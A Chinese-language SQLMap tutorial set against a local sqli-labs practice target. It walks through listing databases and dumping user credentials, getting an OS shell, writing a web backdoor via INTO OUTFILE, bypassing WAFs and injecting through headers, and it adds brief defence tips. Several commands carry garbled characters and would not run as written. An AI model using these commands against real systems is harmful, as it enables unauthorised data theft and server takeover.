SQLMAP

◆使用SQLMap得出数据库信息的基本流程如下 :

1.检查是否存在注入点：

●sqlmap -u “http://192.168.198.128/sqli-labs-master/Less-1/?id=1"

●参数: -u #目标URL

2.查看所有数据库

●sq|map -u “http://192.168.198.128/sqli-labs-master/Less-1/?id=1"--dbs

●参数: -u #目标URL、–dbs #所有数据库

3.查看当前使用的数据库

●sqImap -u “http://192.168.198.128/sqli-labs-master/Less-1/?id=1" –current-db –current-db #查看网站当前的数据库

●参数:-u #目标URL

4.查看表名

●sqlmap -u “http://192.168.198.128/sqli-labs-master/Less-1/?id=1" -D security –tables

●参数:-u #目标URL

​ -D #指定数据库

​ –tables #列出表名

5.列出所有字段名

sqlmap -u “http://192.168.198.128/sqli-labs-master/Less- 1/?id=1” -D security -T users –columns

●参数:-u #目标URL

​ -T #指定表名

​ – columns #列出所有的字段名

6.列出字段内容 (数据)

sqlmap -U “http://192.168.198.128/sqli-labs-master/Less 1/?id=1” -D security -T users -C username，password –dump

●参数:-u #目标URL

​ -C #指定字段

​ – dump #列出字段内容,转存数据

SQLmap的常用参数

◆输出级别参数( Output verbosity )

➢参数:-V

➢使用方法: -v <级别>如: sqlmap -u [URL] -V 3

➢参数详情: SQLmap的输出信息按从简到繁，从0-6共分为7个级别,默认的输出级别为1。

➢各个输出级别的描述如下 :

0:只显示python的回溯、错误和关键信息

1 :显示信息和警告消息

2 :显示调式信息

3 :显示注入使用的攻击载荷

4 :显示HTTP请求

5 :显示HTTP响应头

6:显示HTTP相应页面的内容

◆测试注入点权限

➢参数:–privileges

➢用法: sqImap -u [URL] –privileges //测试所有用户的权限

​ sqlmap -u [URL] –privileges -U sa //测试sa用户的权限

➢说明:当前用户有读取包含了数据库管理系统中用户信息的系统表的权限时使用这一参数可以列举数据库管理系统中用户的权限。通过用户权限可以判断哪些用户是管理员。

➢注意:若目标是MSSql数据库，这一参数会列出每个用户是否是管理员而不列出每个用户的具体权限。

◆执行shell命令

➢参数: -os-cmd / -os-shell

➢使用方法 : sqlmap -u [URL] – os-Cmd=”net user”//执行net user命令

​ sqlmap -u [URL] – os-shell //系统交互式的shell

➢危害:用-os-shell命令可以模拟一个真实的shell ,可以使用INTO OUTFILE写进可写目录,创建一个web后门。

➢注意: 1、 需要有权限使用特定函数2、数据库为mysql、postgresql和sqlserver

◆POST提交方式

➢参数: 1.-data //通过post方式提交参数

​ 2.-r txt文件//读取文件中的HTTP数据包内容用来测试POST注入和HTTP Header注入

➢使用方法: sq|map -u [URL] –data “POST参数”

​ sqIlmap -u [URL] -r “.txt文件”

◆获取数据库的用户名和密码

➢参数: 1.-users//枚举所有的用户

​ 2.-passwords //枚举所有的用户密码

➢使用方法: sqlmap -u [URL] –users -passwords

◆tamper参数

➢作用:

●tamper则是对其进行扩展的一系列脚本,主要功能是对本来的payload进行特定的更改以绕过waf

SQLMap的深入理解

◆探测等级

➢参数: –level

➢用法: sqlmap -u [URL] –level 3

➢说明 : SQLMap一共有5个探测等级，默认是1,SQLMap使用的Payload可以在xml/payloads.xml中看到，也可以根据相应的格式添加自己的payload.

level 1 :对GET和POST的数据进行测试

level 2 :会对HTTP cookie进行测试

level 3 :会对HTTP User-Agent/Referer头进行测试

level 4-5:测试的更加全面，同时测试的速度会更慢

➢注意: 在不确定哪个Payload或参数为注入点时,为了保证全面性,建议使用高的level值

◆判断当前用户是否为管理员权限

➢参数: –is-dba

➢用法: sqlmap -u [URL] –is-dba

➢说明:该命令用于查看当前账户是否为数据库管理员账户。这个命令有时候决定了你是否可以在服务器下进行写的操作，是否有写的权限,代表你是否可以在服务器上面写入一句话木马

➢结果:如果是管理员会返回Ture，否则返回False

◆列出数据库管理员角色

➢参数: –roles

➢用法: sqlmap -u [URL] –roles

➢说明 :该命令用于查看数据库用户角色,如果当前用户有去读取包含所有用户的表，输入该命令会列举出每个用户的角色，也可以用-U参数指定想看哪个用户的角色

◆列举数据库管理系统信息

➢参数: -b或-banner

➢用法: sqImap -u [URL] –banner

➢说明 :返回数据库管理系统的版本号和最后的补丁级别以及底层的操作系统信息。

SQLMap的HTTP头部注入

◆HTTP方法

➢参数: -method

➢用法: sqlmap -u [URL] -method “PUT”

➢说明: 一般来说，Sqlmap能自动判断出是使用GET方法还是POST方法,但在某些情况下需要的可能是PUT等很少见的方法,此时就需要用参数”-method”来指定方法。

◆cookie注入

➢参数: –cookie

➢用法: sqlmap -u [url] –cookie=”SESSIONIDxxxx;NAME=ichunqiu;” –level 2 –data””

➢说明:当需要对cookie注入的时候,必须使用–cookie选项,–data””因为post的数据长度为0 ,但是又想使用post方法进行注入，则使用–data””,使用–data选项后，sqlmap自动使用post方法。

➢注意: 1、sqlmap不支持使用–method指定http请求的方法。

2、默认不扫cookie的内容，必须是level大于等于2才能扫cookie里的内容

3、cookie默认的分隔符为”;”

◆User-Agent注入

➢参数: -user-agent和-random-agent

➢用法: –user-agent= “Mozilla/5.0 (Windows NT 6.1; WoW64; rv:16.0) Gecko/20100101 Firefox/16.0”

➢说明:”-user-agent”可以指定一 个User-Agent值。 参数”-random- agent” ，Sqlmap会从文件./txt/user-agents.txt中随机地取一个User-Agent

➢注意:1、在一次会话中只有使用同一个User-Agent ,并不是每发一个HTTP请求包,都随机一个User-Agent。

​ 2、必须是level大于等于3才会尝试对referer注入。

◆Referer注入

➢参数: -referer

➢用法: -referer=”aaa”

➢说明:使qlmap可以在请求中伪造HTTP中的referer, Sqlmap发送的HTTP请求头部默认无Referer字段。

➢注意:必须是level大于等于3才会尝试对referer注入。

SQLMap执行SQL语句

◆执行文件中的SQL语句

➢参数: –sgl-file

➢用法: sqlmap -u [URL] –sqL-file=sql文件

➢说明:参数可以直接执行SQL文件中的语句。

➢举例:新建一个SQL文件,如: 1.sql

内容为: select version();select @@datadir;

在sqlmap工具中输入sqlmap -u [url] –sql-file=1.sql

如上,MySQL的版本、MySQL 数据库存放的路径都被查询到

SQLMap的文件操作

◆了解SQL注入可以进行文件读写操作带来的危害

➢如果当前web页面存在SQL注入漏洞,且当前的用户是root权限,且可以进行文件读写操作

➢我们可以在知道绝对路径的情况下,尝试上传一个句话木马，并用菜刀连接后,获取到网站的getshell

◆SQL注入导致的文件读写的防御方法

1.将secure- file-priv的参数在my.ini中配置为secure-file- priv= null将会限制mysqld不允许导入导出操作

​ secure-file- priv的配置,可以通过语句: select @@secure_file_priv 查询

2.在用户输入可控参数时,对敏感语句进行过滤

◆上传文件

●参数: –file-write –file-dest

用法: sqlmap -u [URL] –file-write“写入本地文件的地址” –file-dest “要写入的文件绝对路径”

●说明:该命令用于写入本地文件到服务器中，上传的文件可以是文本，也可以是二进制文件

●原理:利用mysq|的into outfile函数如: union select 1,2, ‘aaa’ into outfile ‘C:\phpstudy_ pro\www\test1.txt’

●条件:

1.文件必须在服务器上

2.已知绝对路径

3.有写文件权限( secure-file- priv是否被禁用，是否有目录权限等等)

4.必须能绕过单引号过滤

5.具有特定的函数执行特权, 一般要求root

6.数据库为mysql、postgresql和sqlserver
